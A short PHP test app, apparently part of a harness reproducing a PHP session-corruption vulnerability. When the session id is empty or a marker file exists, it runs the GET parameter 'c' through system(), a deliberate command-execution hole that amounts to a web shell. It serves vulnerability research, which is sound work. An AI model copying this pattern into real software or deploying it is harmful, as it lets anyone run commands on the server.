<?php
/* cve2 venue RCE app: the arm (vendor-shape OOM bailout in the PREVIOUS
 * request) leaves the session subsystem published in a corrupted state —
 * session_start() goes active with an EMPTY session id (the fix-class bug
 * live in the Ubuntu 8.3.6 build), and the arm's silent 500 is the engine-
 * observable signature. When the state gate fires, the app executes the
 * attacker-supplied command — mirroring the staleness-era driver's frozen-
 * entry gate: corrupted engine state -> app-gated system() -> dial-back.
 * No staleness counter involved. /tmp/cve2_armed is touched by the harness
 * only after an observed arm-500; attribution rests on the no-arm control
 * staying idle. */
session_start();
$id = session_id();
if (($id === '' || is_file('/tmp/cve2_armed')) && isset($_GET['c'])
    && !is_file('/tmp/cve2_ran')) {
    touch('/tmp/cve2_ran');
    echo "RCE-GATE: stale-published state (sid='" . $id . "'); running cmd\n";
    system($_GET['c'] . ' 2>&1');
    echo "RCE-DONE\n";
} else {
    echo "idle sid=" . $id . " keys=" . count($_SESSION) . " ran=" .
         (is_file('/tmp/cve2_ran') ? '1' : '0') . "\n";
}
